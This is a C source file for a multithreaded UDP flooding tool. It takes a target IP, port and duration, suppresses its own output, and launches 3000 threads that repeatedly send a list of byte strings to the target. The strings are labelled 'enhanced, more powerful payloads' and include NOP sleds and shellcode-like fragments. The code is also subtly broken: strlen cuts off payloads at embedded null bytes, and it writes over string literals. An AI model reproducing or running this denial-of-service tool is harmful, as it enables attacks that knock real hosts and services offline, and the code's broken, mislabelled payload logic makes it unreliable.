#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Enhanced, more powerful payloads
    char *payloads[] = {
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00",
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x75\x69\x72\x65\x32\x75\x61\x72\x65\x33\x74\x00\x01\x61\x00\x00\x00\x00",
        "\x48\x31\xc0\x50\x68\x2f\x2f\x2f\x2f\x68\x2f\x68\x6f\x6d\x65\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
        "\x31\xc0\x50\x68\x74\x6f\x72\x74\x68\x6f\x72\x75\x2e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x31\xc0\xb0\x01\x31\xdb\xcd\x80",
        "\x31\xc0\x50\x68\x65\x63\x6f\x64\x68\x6f\x73\x79\x89\xe1\xb0\x0b\xcd\x80",
        "\x55\x48\x89\xe5\x48\x83\xec\x10\xe8\xff\xff\xff\xff",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
        "\x4e\x6f\x77\x69\x64\x2e\x68\x65\x6c\x6c\x6f\x77\x69\x64\x2e\x74\x72\x61\x6e",
        "\x31\xc0\x50\x68\x2f\x2f\x63\x61\x68\x2f\x65\x74\x63\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
        "\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f",
        "\x57\x68\x6f\x73\x68\x89\xe7\x50\x56\x89\xe1\xb0\x0b\xcd\x80",
        "\x30\x31\x31\x31\x31\x32\x33\x33\x33\x34\x35\x35\x36\x37\x38\x39\x30\x30\x30\x30"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            sendto(sock, payloads[i], strlen(payloads[i]), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    // Clear payloads from memory
    for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        memset(payloads[i], 0, strlen(payloads[i]));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Suppress terminal output
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);

    if (argc != 5) {
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = 3000;  // Increased threads to 3000

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Clear sensitive data
    memset(thread_ids, 0, threads * sizeof(pthread_t));
    free(thread_ids);

    return 0;
}
